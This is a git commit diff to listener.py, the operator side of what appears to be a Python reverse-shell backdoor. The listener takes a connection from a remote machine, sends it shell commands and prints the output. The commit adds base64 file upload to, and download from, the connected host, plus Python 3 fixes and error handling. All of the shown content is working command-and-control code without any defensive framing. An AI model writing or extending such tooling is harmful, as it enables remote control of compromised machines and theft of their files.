d0adaf7aad51682ea32915426200dd8e99db51c5
Berk Ali Çakır <63811690+HellReys@users.noreply.github.com>
2024-07-16 01:23:03 +0300

    Update listener.py

--- listener.py
+++ listener.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 import socket
-import json
+import json, base64
 
 
 class Listener:
@@ -15,10 +15,10 @@ class Listener:
         print("[+] Got a connection from" + str(address))
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
-        json_data =""
+        json_data = b""
         while True:
             try:
                 json_data = json_data + self.connection.recv(1024)
@@ -36,15 +36,26 @@ class Listener:
         return self.connection.recv()
     def write_file(self,path, content):
         with open(path, "wb") as file:
-            file.write(content)
+            file.write(base64.b64decode(content))
             return "[+] Download Successful."
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
     def run(self):
         while True:
             command = input(">> ")
             command = command.split(" ")
-            result = self.execute_remotely(command)
-            if command[0] == "download":
-                result = self.write_file(command[1],result)
+
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+
+                result = self.execute_remotely(command)
+                if command[0] == "download" and "[-] Error " not in result:
+                    result = self.write_file(command[1],result)
+            except Exception:
+                result = "[-] Error during command execution"
 
             print(result)
 
